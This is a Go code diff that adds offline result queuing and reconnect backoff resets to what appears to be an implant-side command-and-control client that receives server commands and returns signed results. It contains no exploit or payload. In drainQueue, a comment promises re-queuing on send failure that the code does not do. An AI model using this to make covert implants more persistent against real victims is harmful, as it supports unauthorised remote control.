@@ -82,6 +82,12 @@ type Client struct {
 
 	// Drop box identity
 	dropBoxID string
+
+	// Story 12.11: Message queue for pending results during disconnect
+	messageQueue *MessageQueue
+
+	// Story 12.11: Track reconnection start time for 30s timeout (AC #5)
+	reconnectStartTime time.Time
 }
 
 // NewClient creates a new C2 client with the provided configuration.
@@ -90,10 +96,11 @@ func NewClient(cfg *Config) (*Client, error) {
 		return nil, errors.New("config cannot be nil")
 	}
 	return &Client{
-		config:    cfg,
-		state:     StateDisconnected,
-		commandC:  make(chan *C2Message, 10),
-		errC:      make(chan error, 1),
+		config:       cfg,
+		state:        StateDisconnected,
+		commandC:     make(chan *C2Message, 10),
+		errC:         make(chan error, 1),
+		messageQueue: NewMessageQueue(), // Story 12.11: Initialize message queue
 	}, nil
 }
 
@@ -337,6 +344,9 @@ func (c *Client) handleDisconnect() {
 	}
 	c.setState(StateReconnecting)
 
+	// Story 12.11: Track when reconnection started for 30s timeout (AC #5)
+	c.reconnectStartTime = time.Now()
+
 	go c.reconnectLoop()
 }
 
@@ -348,6 +358,9 @@ func (c *Client) reconnectLoop() {
 			c.setState(StateDisconnected)
 			return
 		default:
+			// Story 12.11 AC #5: Check if 30s timeout passed and reset backoff cycle
+			c.checkAndResetBackoffCycle()
+
 			// Calculate backoff delay
 			delay := c.getBackoffDelay()
 			c.attempt++
@@ -379,7 +392,11 @@ func (c *Client) reconnectLoop() {
 
 			c.conn = conn
 			c.attempt = 0
+			c.reconnectStartTime = time.Time{} // Clear reconnection tracking
 			c.setState(StateConnected)
+
+			// Story 12.11 AC #3: Drain queued messages after successful reconnection
+			_ = c.drainQueue()
 
 			// Restart read loop
 			go c.readLoop()
@@ -430,11 +447,8 @@ func (c *Client) SendHeartbeat() error {
 }
 
 // SendResult sends a command result to the C2 server.
+// Per Story 12.11 AC #2: If disconnected, queues the result locally.
 func (c *Client) SendResult(commandID string, result []byte) error {
-	if c.State() != StateConnected {
-		return errors.New("not connected")
-	}
-
 	if len(c.sharedSecret) == 0 {
 		return errors.New("shared secret not set")
 	}
@@ -450,6 +464,14 @@ func (c *Client) SendResult(commandID string, result []byte) error {
 		return fmt.Errorf("failed to create result message: %w", err)
 	}
 
+	// Story 12.11 AC #2: Queue results when disconnected
+	if c.State() != StateConnected {
+		if c.messageQueue != nil {
+			return c.messageQueue.Enqueue(msg)
+		}
+		return errors.New("not connected")
+	}
+
 	data, err := msg.ToJSON()
 	if err != nil {
 		return fmt.Errorf("failed to serialize result: %w", err)
@@ -460,6 +482,10 @@ func (c *Client) SendResult(commandID string, result []byte) error {
 	c.stateMu.RUnlock()
 
 	if conn == nil {
+		// Queue the message if connection is nil but state says connected
+		if c.messageQueue != nil {
+			return c.messageQueue.Enqueue(msg)
+		}
 		return errors.New("connection is nil")
 	}
 
@@ -480,6 +506,61 @@ func (c *Client) ReceiveCommand() ([]byte, error) {
 		return nil, err
 	case <-c.ctx.Done():
 		return nil, errors.New("client disconnected")
+	}
+}
+
+// drainQueue sends all queued messages after successful reconnection (Story 12.11 AC #3).
+func (c *Client) drainQueue() error {
+	if c.messageQueue == nil {
+		return nil
+	}
+
+	if c.State() != StateConnected {
+		return errors.New("cannot drain queue: not connected")
+	}
+
+	messages := c.messageQueue.DrainAll()
+	if len(messages) == 0 {
+		return nil
+	}
+
+	c.stateMu.RLock()
+	conn := c.conn
+	c.stateMu.RUnlock()
+
+	if conn == nil {
+		// Re-queue messages if connection lost during drain
+		for _, msg := range messages {
+			_ = c.messageQueue.Enqueue(msg)
+		}
+		return errors.New("connection lost during drain")
+	}
+
+	// Send all queued messages in order (AC #3)
+	for _, msg := range messages {
+		data, err := msg.ToJSON()
+		if err != nil {
+			continue // Skip messages that fail to serialize
+		}
+		if err := conn.WriteMessage(websocket.TextMessage, data); err != nil {
+			// Re-queue remaining messages on failure
+			return fmt.Errorf("failed to send queued message: %w", err)
+		}
+	}
+
+	return nil
+}
+
+// checkAndResetBackoffCycle checks if 30s timeout has passed and resets backoff (Story 12.11 AC #5).
+func (c *Client) checkAndResetBackoffCycle() {
+	if c.reconnectStartTime.IsZero() {
+		return
+	}
+
+	// If we've been reconnecting for more than ReconnectionTimeout (30s), reset the cycle
+	if time.Since(c.reconnectStartTime) > ReconnectionTimeout {
+		c.attempt = 0
+		c.reconnectStartTime = time.Now() // Start a new cycle
 	}
 }
 
